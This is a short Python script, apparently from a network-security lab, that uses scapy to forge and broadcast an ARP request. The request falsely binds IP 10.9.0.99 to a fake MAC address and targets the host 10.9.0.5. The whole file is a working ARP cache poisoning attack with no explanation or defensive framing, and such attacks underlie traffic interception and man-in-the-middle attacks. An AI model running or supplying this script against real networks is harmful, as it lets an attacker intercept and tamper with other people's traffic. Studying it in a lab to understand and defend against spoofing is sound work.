#!/usr/bin/env python3
from scapy.all import *

IP_V = "10.9.0.5"
MAC_V_real = "02:42:0a:09:00:05"
IP_T = "10.9.0.99"
MAC_T_fake ="aa:bb:cc:dd:ee:ff"

ether = Ether(src = "aa:bb:cc:dd:ee:ff" , dst = "ff:ff:ff:ff:ff:ff")
arp = ARP(psrc = "10.9.0.99", hwsrc = "aa:bb:cc:dd:ee:ff" , pdst ="10.9.0.5")
arp.op = 1
frame = ether/arp
sendp(frame)
